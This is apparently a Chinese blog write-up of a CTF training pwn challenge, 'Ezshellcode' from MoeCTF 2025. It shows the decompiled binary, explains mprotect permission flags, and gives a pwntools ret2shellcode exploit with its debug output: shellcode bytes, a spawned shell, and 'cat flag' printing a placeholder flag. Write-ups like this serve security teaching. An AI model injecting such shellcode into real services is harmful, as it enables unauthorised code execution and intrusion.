---
title: '西电CTF MoeCTF 2025 PWN 2 Ezshellcode'
date: '2026-09-03T17:59:54+08:00'
lastmod: '2026-09-03T17:59:54+08:00'
summary: ""
hideSummary: true
draft: false
author: "QingKong996"
categories:
  - ""
tags:
  - ""
---

```
本文为人工撰写，仅使用生成式AI校对。
```

[题目链接](https://ctf.xidian.edu.cn/training/22?challenge=919)

> 根据题目提示，本题是ret2shellcode[^CTF Wiki]

按照惯例丢到IDA里。

 ```c
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
   int v4; // [rsp+0h] [rbp-20h] BYREF
   int prot; // [rsp+4h] [rbp-1Ch]
   int v6; // [rsp+8h] [rbp-18h]
   int v7; // [rsp+Ch] [rbp-14h]
   void *s; // [rsp+10h] [rbp-10h]
   unsigned __int64 v9; // [rsp+18h] [rbp-8h]
 
   v9 = __readfsqword(0x28u);
   init(argc, argv, envp);
   s = mmap(0LL, 0x1000uLL, 3, 34, -1, 0LL);
   if ( s == (void *)-1LL )
   {
     perror("mmap");
     return 1;
   }
   memset(s, 0, 0x1000uLL);
   v6 = 0;
   prot = 0;
   puts("In a ret2text exploit, we can use code in the .text segment.");
   puts("But now, there is no 'system' function available there.");
   puts("How can you get the flag now? Perhaps you should use shellcode.");
   puts("But what is shellcode? What can you do with it? And how can you use it?");
   puts("I will give you some choices. Choose wisely!");
   __isoc99_scanf("%d", &v4);
   do
     v7 = getchar();//
   while ( v7 != 10 && v7 != -1 );
   if ( v4 == 4 )
   {
     if ( v6 == 1 )
       puts("You can only make one change!");
     prot = 7;
     v6 = 1;
   }
   else
   {
     if ( v4 > 4 )
       goto LABEL_24;
     switch ( v4 )
     {
       case 3:
         if ( v6 == 1 )
           puts("You can only make one change!");
         prot = 4;
         v6 = 1;
         break;
       case 1:
         if ( v6 == 1 )
           puts("You can only make one change!");
         prot = 1;
         v6 = 1;
         break;
       case 2:
         if ( v6 == 1 )
           puts("You can only make one change!");
         prot = 3;
         v6 = 1;
         break;
       default:
 LABEL_24:
         puts("Invalid choice. The space remains in its chaotic state.");
         exit(1);
     }
   }
   if ( mprotect(s, 0x1000uLL, prot) == -1 )
   {
     perror("mprotect");
     exit(1);
   }
   puts("\nYou have now changed the permissions of the shellcode area.");
   puts("If you can't input your shellcode, think about the permissions you just set.");
   read(0, s, 0x1000uLL);
   ((void (*)(void))s)();
   return 0;
 }
 ```

> int mprotect(const void *start, size_t len, int prot);[^1]
>
> mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
>
> prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：
>
> 1）PROT_READ：表示内存段内的内容可读；
>
> 2）PROT_WRITE：表示内存段内的内容可写；
>
> 3）PROT_EXEC：表示内存段中的内容可执行；
>
> 4）PROT_NONE：表示内存段中的内容根本没法访问。
>
> port常量的定义
>
> #define PROT_NONE  0x0
> #define PROT_READ  0x1
> #define PROT_WRITE 0x2
> #define PROT_EXEC  0x4
>
> 这里直接设置为0x1 | 0x2 | 0x4 即 0x7

注意到`((void (*)(void))s)();`这里直接把s强转成函数(输入void，返回void)指针调用。

所以直接构造shellcode即可。



pwntools脚本:

```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

io = connect("127.0.0.1", 39683)


shellcode = asm(shellcraft.sh())
# #
io.sendline(b'4')
#
io.sendline(shellcode)

io.interactive()

```

输出:

```
[x] Opening connection to 127.0.0.1 on port 39683
[x] Opening connection to 127.0.0.1 on port 39683: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 39683: Done
[DEBUG] ...
[DEBUG] Sent 0x2 bytes:
    b'4\n'
[DEBUG] Sent 0x31 bytes:
    00000000  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
    00000010  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
    00000020  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
    00000030  0a                                                  │·│
    00000031
[*] Switching to interactive mode
[DEBUG] Received ...
In a ret2text exploit, we can use code in the .text segment.
But now, there is no 'system' function available there.
How can you get the flag now? Perhaps you should use shellcode.
But what is shellcode? What can you do with it? And how can you use it?
I will give you some choices. Choose wisely!
[DEBUG] Received ...

You have now changed the permissions of the shellcode area.
If you can't input your shellcode, think about the permissions you just set.


ls
[DEBUG] Sent ...
[DEBUG] Received ...
bin
flag
lib
lib32
lib64
libexec
libx32
pwn

cat flag
[DEBUG] Sent ...
[DEBUG] Received ...
moectf{THIS_IS_FLAG}
[*] Interrupted
[*] Closed connection to 127.0.0.1 port 39683
```





[^1]:[C语言之 mprotect](https://www.cnblogs.com/Max-hhg/articles/13939064.html)
[^CTF Wiki]:[ret2shellcode](https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2shellcode)
